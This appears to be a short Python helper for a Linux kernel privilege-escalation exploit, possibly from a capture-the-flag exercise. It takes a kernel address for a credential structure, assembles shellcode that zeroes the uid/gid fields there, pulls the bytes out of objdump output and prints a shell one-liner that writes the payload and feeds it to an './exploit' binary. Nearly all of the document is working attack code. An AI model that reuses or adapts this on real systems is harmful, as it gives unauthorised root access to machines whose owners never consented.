import re, subprocess, os, time

#0xffff88800e03d830
def gen_shellcode(addr):
	pre_shell = f'''\nxor rax, rax\nxor rbx, rbx\n\nmov rax, {str(addr)}\nmov rbx, qword [rax]\n\nxor r15, r15\nmov qword [rbx], r15\nmov qword [rbx+8], r15\nmov qword [rbx+16], r15\nret'''
	with open("shellcode.asm", "w") as f:
		f.write(pre_shell)
		f.close()
	a = subprocess.getoutput("nasm -f elf64 shellcode.asm")
	stdout = subprocess.check_output(['/usr/bin/objdump', '-d', 'shellcode.o'])
	bytes = []
	for x in stdout.split():
		parsed_bytes = ''.join(re.findall('^[0-9a-f][0-9a-f]$', x.decode("utf-8")))
		if parsed_bytes is not b'':
			bytes.append(parsed_bytes)

	shellcode = ''
	shellcode_size = len(bytes)
	for byte in bytes:
		if len(byte) != 0:
			shellcode += r'\x' + byte

	parse = f'echo -ne "{shellcode}" > load; chmod 777 load; ./load; (cat ./load ; cat) | ./exploit load'
	return parse

#print(gen_shellcode(0xffffffff85a457a0))

modprobe = input("struct cred addr: ")
print(gen_shellcode(str(modprobe)))
